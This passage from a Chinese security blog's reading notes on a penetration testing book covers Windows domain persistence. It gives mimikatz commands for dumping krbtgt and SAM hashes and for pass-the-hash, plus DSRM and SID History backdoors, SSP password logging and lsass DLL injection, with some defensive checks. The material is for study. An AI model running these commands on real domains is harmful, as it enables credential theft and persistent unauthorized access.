+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-WMIObject -Namespace root\Subscription -Class CommandLineEventConsumer</span><br></pre></td></tr></table></figure>
+
+
+
+<p>清理WMI后门的方法：删除自动运行列表中的恶意WMI条目，使用Get-WMIObject命令删除与WMI持久化相关的组件。</p>
+<h2 id="8-2-WEB后门"><a href="#8-2-WEB后门" class="headerlink" title="8.2 WEB后门"></a>8.2 WEB后门</h2><h3 id="Nishang下的WEBShell"><a href="#Nishang下的WEBShell" class="headerlink" title="Nishang下的WEBShell"></a>Nishang下的WEBShell</h3><h3 id="Weevely后门"><a href="#Weevely后门" class="headerlink" title="Weevely后门"></a>Weevely后门</h3><h3 id="webacoo后门工具"><a href="#webacoo后门工具" class="headerlink" title="webacoo后门工具"></a>webacoo后门工具</h3><h2 id="8-3-域控制器权限持久化分析与防范"><a href="#8-3-域控制器权限持久化分析与防范" class="headerlink" title="8.3 域控制器权限持久化分析与防范"></a>8.3 域控制器权限持久化分析与防范</h2><h3 id="DSRM后门"><a href="#DSRM后门" class="headerlink" title="DSRM后门"></a>DSRM后门</h3><p>使用mimikatz查看krbtgt账户密码hash值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\mimikatz.exe &quot;privilege::debug&quot; &quot;lsadump::lsa /patch /name:krbtgt&quot; exit</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/1580632072058.png" alt="1580632072058"></p>
+<p>查看SAM文件中本地管理员的NTLM HASH值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\mimikatz.exe &quot;token::elevate&quot; &quot;lsadump::sam&quot; exit</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/images/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/1580632105280.png" alt="1580632105280"></p>
+<p>这里的4cb开头的hash就是DSRM hash，将DSRM hash和kebtgt的密码同步：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil</span><br><span class="line">set dsrm password</span><br><span class="line">SYNC FROM DOMAIN account krbtgt</span><br><span class="line">q</span><br></pre></td></tr></table></figure>
+
+
+
+<p>再次查看会发现DSRM密码和krbtgt的密码相同，然后修改DSRM的登陆方式，这个注册表键值为2表示”在任何情况下都可以使用DSRM管理员账号登陆域控制器”：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">New-ItemProperty &quot;hklm:\system\currentcontrolset\control\lsa\&quot; -name &quot;dsrmadminlogonbehavior&quot; -value 2 -propertyType DWORD</span><br></pre></td></tr></table></figure>
+
+
+
+<p>使用mimikatz进行pth攻击：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\mimikatz.exe &quot;privilege::Debug&quot; &quot;sekurlsa::pth /domain:DC /user:administrator /ntlm:XXXXXXXXXXX&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>DSRM后门防御措施：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">检查hklm\system\currentcontrolset\control\lsa\dsrmadminlogonbehavior注册表键值的值，确认值为1定期修改DSRM的账号经常检查ID为4794的日志</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="SSP维持域控权限"><a href="#SSP维持域控权限" class="headerlink" title="SSP维持域控权限"></a>SSP维持域控权限</h3><p>方式一：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\mimikatz.exe &quot;privilege::debug&quot; &quot;misc::memssp&quot; exit</span><br></pre></td></tr></table></figure>
+
+
+
+<p>注销之后执行命令查看明文密码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe cat c:\windows\system32\mimilsa.log</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/1580633439725.png" alt="1580633439725"></p>
+<p>方式二：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe cp .\mimilib.dll C:\Windows\System32\Set-ItemProperty &quot;hklm:\system\currentcontrolset\control\lsa\&quot; -name &quot;Security Packages&quot; -value &quot;mimilib.dll&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>重启之后使用命令查看密码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe cat c:\windows\system32\kiwissp.log</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/images/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/1580634150155.png" alt="1580634150155"></p>
+<p>防御措施：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">查看hklm\system\currentcontrolset\control\lsa\Security Packages注册表项是否含有可疑的DLL文件检查C:\windows\system32\目录下是否存在可疑的文件第三方工具检查</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="SID-History后门"><a href="#SID-History后门" class="headerlink" title="SID History后门"></a>SID History后门</h3><p>test为恶意账户，administrator</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Import-module ActiveDirectoryGet-ADUser xiaom -Properties sidhistory.\mimikatz.exe &quot;privilege::Debug&quot; &quot;sid::patch&quot; &quot;sid::add /sam:xiaom /new:administrator&quot; exit</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/images/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/1580634645757.png" alt="1580634645757"></p>
+<p>此时使用xiaom账号可以访问域控</p>
+<p><img src="/images/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/1580634734506.png" alt="1580634734506"></p>
+<h3 id="Golden-Ticket-and-Silver-Ticket"><a href="#Golden-Ticket-and-Silver-Ticket" class="headerlink" title="Golden Ticket and Silver Ticket"></a>Golden Ticket and Silver Ticket</h3><h3 id="Skeleton-Key"><a href="#Skeleton-Key" class="headerlink" title="Skeleton Key"></a>Skeleton Key</h3><h3 id="Hook-PasswordChangeNotify"><a href="#Hook-PasswordChangeNotify" class="headerlink" title="Hook PasswordChangeNotify"></a>Hook PasswordChangeNotify</h3><p>这个方法要使用Invoke-ReflectivePEInjection.ps1将HookPasswordChange.dll注入内存，在目标系统中启动管理员权限的powershell：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">. .\Invoke-ReflectivePEInjection.ps1Invoke-ReflectivePEInjection -PEPath HookPasswordChange.dll -procname lsass</span><br></pre></td></tr></table></figure>
+
+
+
+<p>此时如果再修改用户密码则修改之后的密码会记录在C:\windows\Temp\password.txt文件中。</p>
+<p>工具下载地址：<a target="_blank" rel="noopener" href="https://github.com/clymb3r/PowerShell/blob/master/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1">https://github.com/clymb3r/PowerShell/blob/master/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/clymb3r/Misc-Windows-Hacking">https://github.com/clymb3r/Misc-Windows-Hacking</a></p>
+<p>参考地址：<a target="_blank" rel="noopener" href="http://www.vuln.cn/6812">http://www.vuln.cn/6812</a></p>
+<h2 id="8-4-Nishang下的脚本后门分析与防范"><a href="#8-4-Nishang下的脚本后门分析与防范" class="headerlink" title="8.4 Nishang下的脚本后门分析与防范"></a>8.4 Nishang下的脚本后门分析与防范</h2><h3 id="HTTP-Backdoor"><a href="#HTTP-Backdoor" class="headerlink" title="HTTP-Backdoor"></a>HTTP-Backdoor</h3><h3 id="Add-ScrnSaveBackdoor"><a href="#Add-ScrnSaveBackdoor" class="headerlink" title="Add-ScrnSaveBackdoor"></a>Add-ScrnSaveBackdoor</h3><h3 id="Execute-OnTime"><a href="#Execute-OnTime" class="headerlink" title="Execute-OnTime"></a>Execute-OnTime</h3><h3 id="Invoke-ADSBackdoor"><a href="#Invoke-ADSBackdoor" class="headerlink" title="Invoke-ADSBackdoor"></a>Invoke-ADSBackdoor</h3>
+    </article>
+    <!-- license -->
+    
+        <div class="license-wrapper">
+            <p>原文作者：<a href="http://example.com">Drunkmars</a>
+            <p>原文链接：<a href="http://example.com/2021/05/29/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/">http://example.com/2021/05/29/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/</a>
+            <p>发表日期：<a href="http://example.com/2021/05/29/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/">May 29th 2021, 12:00:00 am</a>
+            <p>更新日期：<a href="http://example.com/2021/05/29/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/">May 30th 2021, 3:59:41 am</a>
+            <p>版权声明：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href="/2021/06/01/%E7%BC%96%E5%86%99exp/" title="如何编写属于自己的第一个exp">
+                    <div class="nextTitle">如何编写属于自己的第一个exp</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2021/05/28/moonsec/" title="vulnhub靶场实战">
+                    <div class="prevTitle">vulnhub靶场实战</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- comment -->
+    
+        <div class="post-comment">
+            <!-- 来必力 City 版安装代码 -->
+
+
+            
+
+            
+
+            
+
+            <!-- utteranc评论 -->
+
+
+            <!-- partial('_partial/comment/changyan') -->
+            <!--PC版-->
+
+
+            
+            
+
+        </div>
+    
+    <!-- timeliness note -->
+    <!-- idea from: https://hexo.fluid-dev.com/posts/hexo-injector/#%E6%96%87%E7%AB%A0%E6%97%B6%E6%95%88%E6%80%A7%E6%8F%90%E7%A4%BA -->
+    
+    <!-- Mathjax -->
+    
+</main>
+
+                <!-- profile -->
+                
+            </div>
+            <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+        <div class="social">
+            
+    
+        
+            
+                <a href="mailto:drunkmars@vip.qq.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="https://github.com/Drunkmars" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="https://twitter.com/Drunkmars404" class="iconfont-archer twitter" target="_blank" title=twitter></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="/atom.xml" class="iconfont-archer rss" target="_blank" title=rss></a>
+            
+        
+    
+
+
+        </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- website approve for Chinese user -->
+    
+    <!-- 不蒜子  -->
+    
+        <div class="busuanzi-container">
+            
+             
+                <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+            
+        </div>
+    	
+</footer>
+
+        </div>
+        <!-- toc -->
+        
+            <div class="toc-wrapper toc-wrapper-loding" style=
+
+
+
+
+
+
+
+    top:50vh;
+
+>
+                <div class="toc-catalog">
+                    <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+                </div>
+                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80"><span class="toc-number">1.</span> <span class="toc-text">第一章 内网渗透测试基础</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows-Powershell%E5%9F%BA%E7%A1%80"><span class="toc-number">1.1.</span> <span class="toc-text">Windows Powershell基础</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%A1%E9%81%93"><span class="toc-number">1.1.1.</span> <span class="toc-text">管道</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-number">1.1.2.</span> <span class="toc-text">常用命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90%E6%89%A7%E8%A1%8C"><span class="toc-number">1.1.3.</span> <span class="toc-text">绕过本地权限执行</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">第二章 内网信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1-%E6%94%B6%E9%9B%86%E6%9C%AC%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="toc-number">2.1.</span> <span class="toc-text">2.1 收集本机信息</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%9F%A5%E8%AF%A2%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE%E5%91%BD%E4%BB%A4"><span class="toc-number">2.1.1.</span> <span class="toc-text">1.查询网络配置命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%9F%A5%E8%AF%A2%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%8F%8A%E8%BD%AF%E4%BB%B6%E7%9A%84%E4%BF%A1%E6%81%AF"><span class="toc-number">2.1.2.</span> <span class="toc-text">2.查询操作系统及软件的信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%9F%A5%E8%AF%A2%E6%9C%AC%E6%9C%BA%E6%9C%8D%E5%8A%A1%E4%BF%A1%E6%81%AF"><span class="toc-number">2.1.3.</span> <span class="toc-text">3.查询本机服务信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E6%9F%A5%E8%AF%A2%E8%BF%9B%E7%A8%8B%E5%88%97%E8%A1%A8"><span class="toc-number">2.1.4.</span> <span class="toc-text">4.查询进程列表</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%9D%80%E6%AF%92%E8%BD%AF%E4%BB%B6%E8%BF%9B%E7%A8%8B"><span class="toc-number">2.1.4.1.</span> <span class="toc-text">常见杀毒软件进程</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E6%9F%A5%E7%9C%8B%E5%90%AF%E5%8A%A8%E7%A8%8B%E5%BA%8F%E4%BF%A1%E6%81%AF"><span class="toc-number">2.1.5.</span> <span class="toc-text">5.查看启动程序信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E6%9F%A5%E7%9C%8B%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="toc-number">2.1.6.</span> <span class="toc-text">6.查看计划任务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E6%9F%A5%E7%9C%8B%E4%B8%BB%E6%9C%BA%E5%BC%80%E6%9C%BA%E6%97%B6%E9%97%B4"><span class="toc-number">2.1.7.</span> <span class="toc-text">7.查看主机开机时间</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-%E6%9F%A5%E8%AF%A2%E7%94%A8%E6%88%B7%E5%88%97%E8%A1%A8"><span class="toc-number">2.1.8.</span> <span class="toc-text">8.查询用户列表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-%E5%88%97%E5%87%BA%E6%88%96%E6%96%AD%E5%BC%80%E6%9C%AC%E5%9C%B0%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%B8%8E%E6%89%80%E8%BF%9E%E6%8E%A5%E7%9A%84%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%B9%8B%E9%97%B4%E7%9A%84%E4%BC%9A%E8%AF%9D"><span class="toc-number">2.1.9.</span> <span class="toc-text">9.列出或断开本地计算机与所连接的客户端之间的会话</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10-%E6%9F%A5%E8%AF%A2%E7%AB%AF%E5%8F%A3%E5%88%97%E8%A1%A8"><span class="toc-number">2.1.10.</span> <span class="toc-text">10.查询端口列表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#11-%E6%9F%A5%E8%AF%A2%E8%A1%A5%E4%B8%81%E5%88%97%E8%A1%A8"><span class="toc-number">2.1.11.</span> <span class="toc-text">11.查询补丁列表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#12-%E6%9F%A5%E8%AF%A2%E6%9C%AC%E6%9C%BA%E5%85%B1%E4%BA%AB%E5%88%97%E8%A1%A8"><span class="toc-number">2.1.12.</span> <span class="toc-text">12.查询本机共享列表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#13-%E6%9F%A5%E8%AF%A2%E8%B7%AF%E7%94%B1%E8%A1%A8%E5%8F%8A%E6%89%80%E6%9C%89%E5%8F%AF%E7%94%A8%E6%8E%A5%E5%8F%A3%E7%9A%84ARP%E7%BC%93%E5%AD%98%E8%A1%A8"><span class="toc-number">2.1.13.</span> <span class="toc-text">13.查询路由表及所有可用接口的ARP缓存表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#14-%E6%9F%A5%E8%AF%A2%E9%98%B2%E7%81%AB%E5%A2%99%E7%9B%B8%E5%85%B3%E9%85%8D%E7%BD%AE"><span class="toc-number">2.1.14.</span> <span class="toc-text">14.查询防火墙相关配置</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%85%B3%E9%97%AD%E9%98%B2%E7%81%AB%E5%A2%99"><span class="toc-number">2.1.14.1.</span> <span class="toc-text">1) 关闭防火墙</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%9F%A5%E7%9C%8B%E9%98%B2%E7%81%AB%E5%A2%99%E9%85%8D%E7%BD%AE"><span class="toc-number">2.1.14.2.</span> <span class="toc-text">2) 查看防火墙配置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E4%BF%AE%E6%94%B9%E9%98%B2%E7%81%AB%E5%A2%99%E9%85%8D%E7%BD%AE"><span class="toc-number">2.1.14.3.</span> <span class="toc-text">3) 修改防火墙配置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E8%87%AA%E5%AE%9A%E4%B9%89%E9%98%B2%E7%81%AB%E5%A2%99%E6%97%A5%E5%BF%97%E7%9A%84%E5%AD%98%E5%82%A8%E4%BD%8D%E7%BD%AE"><span class="toc-number">2.1.14.4.</span> <span class="toc-text">4) 自定义防火墙日志的存储位置</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#15-%E6%9F%A5%E7%9C%8B%E4%BB%A3%E7%90%86%E9%85%8D%E7%BD%AE%E6%83%85%E5%86%B5"><span class="toc-number">2.1.15.</span> <span class="toc-text">15.查看代理配置情况</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#16-%E6%9F%A5%E8%AF%A2%E5%B9%B6%E5%BC%80%E5%90%AF%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5%E6%9C%8D%E5%8A%A1"><span class="toc-number">2.1.16.</span> <span class="toc-text">16.查询并开启远程连接服务</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%9F%A5%E7%9C%8B%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5%E7%AB%AF%E5%8F%A3"><span class="toc-number">2.1.16.1.</span> <span class="toc-text">1) 查看远程连接端口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%9C%A8Windows-server-2003%E4%B8%AD%E5%BC%80%E5%90%AF3389"><span class="toc-number">2.1.16.2.</span> <span class="toc-text">2) 在Windows server 2003中开启3389</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%9C%A8Windows-server-2008%E5%92%8C2012%E4%B8%AD"><span class="toc-number">2.1.16.3.</span> <span class="toc-text">3) 在Windows server 2008和2012中</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-2-%E8%87%AA%E5%8A%A8%E6%94%B6%E9%9B%86%E4%BF%A1%E6%81%AF"><span class="toc-number">2.1.17.</span> <span class="toc-text">2.2.2 自动收集信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-3-Empire%E4%B8%8B%E7%9A%84%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.1.18.</span> <span class="toc-text">2.2.3 Empire下的主机信息收集</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-3-%E6%9F%A5%E8%AF%A2%E5%BD%93%E5%89%8D%E6%9D%83%E9%99%90"><span class="toc-number">2.2.</span> <span class="toc-text">2.3 查询当前权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-4-%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E5%9F%9F"><span class="toc-number">2.3.</span> <span class="toc-text">2.4 判断是否存在域</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-5-%E6%8E%A2%E6%B5%8B%E5%9F%9F%E5%86%85%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA"><span class="toc-number">2.4.</span> <span class="toc-text">2.5 探测域内存活主机</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-6%E6%89%AB%E6%8F%8F%E5%9F%9F%E5%86%85%E7%AB%AF%E5%8F%A3"><span class="toc-number">2.5.</span> <span class="toc-text">2.6扫描域内端口</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-7-%E6%94%B6%E9%9B%86%E5%9F%9F%E5%86%85%E5%9F%BA%E7%A1%80%E4%BF%A1%E6%81%AF"><span class="toc-number">2.6.</span> <span class="toc-text">2.7 收集域内基础信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-8-%E6%9F%A5%E6%89%BE%E5%9F%9F%E6%8E%A7"><span class="toc-number">2.7.</span> <span class="toc-text">2.8 查找域控</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-9-%E8%8E%B7%E5%8F%96%E5%9F%9F%E5%86%85%E7%9A%84%E7%94%A8%E6%88%B7%E5%92%8C%E7%AE%A1%E7%90%86%E5%91%98%E4%BF%A1%E6%81%AF"><span class="toc-number">2.8.</span> <span class="toc-text">2.9 获取域内的用户和管理员信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-10-%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98"><span class="toc-number">2.9.</span> <span class="toc-text">2.10 定位域管理员</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#psloggedon-exe"><span class="toc-number">2.9.1.</span> <span class="toc-text">psloggedon.exe</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PVEFindADUser"><span class="toc-number">2.9.2.</span> <span class="toc-text">PVEFindADUser</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NetView"><span class="toc-number">2.9.3.</span> <span class="toc-text">NetView</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Netness"><span class="toc-number">2.9.4.</span> <span class="toc-text">Netness</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PowerView"><span class="toc-number">2.9.5.</span> <span class="toc-text">PowerView</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Empire"><span class="toc-number">2.9.6.</span> <span class="toc-text">Empire</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap%E7%9A%84NSE%E8%84%9A%E6%9C%AC"><span class="toc-number">2.9.7.</span> <span class="toc-text">Nmap的NSE脚本</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-11-%E6%9F%A5%E6%89%BE%E5%9F%9F%E7%AE%A1%E7%90%86%E8%BF%9B%E7%A8%8B"><span class="toc-number">2.10.</span> <span class="toc-text">2.11 查找域管理进程</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E7%AB%A0-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF"><span class="toc-number">3.</span> <span class="toc-text">第三章 隐藏通信隧道技术</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#3-1-%E5%B8%B8%E7%94%A8%E9%9A%A7%E9%81%93"><span class="toc-number">3.1.</span> <span class="toc-text">3.1 常用隧道</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E5%86%85%E7%BD%91%E7%9A%84%E8%BF%9E%E9%80%9A%E6%80%A7"><span class="toc-number">3.1.0.1.</span> <span class="toc-text">判断内网的连通性</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-2-%E7%BD%91%E7%BB%9C%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF"><span class="toc-number">3.2.</span> <span class="toc-text">3.2 网络层隧道技术</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#IPv6%E9%9A%A7%E9%81%93"><span class="toc-number">3.2.1.</span> <span class="toc-text">IPv6隧道</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ICMP%E9%9A%A7%E9%81%93"><span class="toc-number">3.2.2.</span> <span class="toc-text">ICMP隧道</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#icmpsh"><span class="toc-number">3.2.2.1.</span> <span class="toc-text">icmpsh</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pingtunnel"><span class="toc-number">3.2.2.2.</span> <span class="toc-text">pingtunnel</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-3-%E4%BC%A0%E8%BE%93%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF"><span class="toc-number">3.3.</span> <span class="toc-text">3.3 传输层隧道技术</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-4-%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF"><span class="toc-number">3.4.</span> <span class="toc-text">3.4 应用层隧道技术</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-5-SOCKS%E4%BB%A3%E7%90%86"><span class="toc-number">3.5.</span> <span class="toc-text">3.5 SOCKS代理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-6-%E5%8E%8B%E7%BC%A9%E6%95%B0%E6%8D%AE"><span class="toc-number">3.6.</span> <span class="toc-text">3.6 压缩数据</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#rar-exe"><span class="toc-number">3.6.1.</span> <span class="toc-text">rar.exe</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-Zip"><span class="toc-number">3.6.2.</span> <span class="toc-text">7-Zip</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-7-%E4%B8%8A%E4%BC%A0%E5%92%8C%E4%B8%8B%E8%BD%BD"><span class="toc-number">3.7.</span> <span class="toc-text">3.7 上传和下载</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#FTP"><span class="toc-number">3.7.1.</span> <span class="toc-text">FTP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#VBS"><span class="toc-number">3.7.2.</span> <span class="toc-text">VBS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8Debug"><span class="toc-number">3.7.3.</span> <span class="toc-text">利用Debug</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8Nishang%E4%B8%8A%E4%BC%A0"><span class="toc-number">3.7.4.</span> <span class="toc-text">利用Nishang上传</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8bitsadmin%E4%B8%8B%E8%BD%BD"><span class="toc-number">3.7.5.</span> <span class="toc-text">利用bitsadmin下载</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" 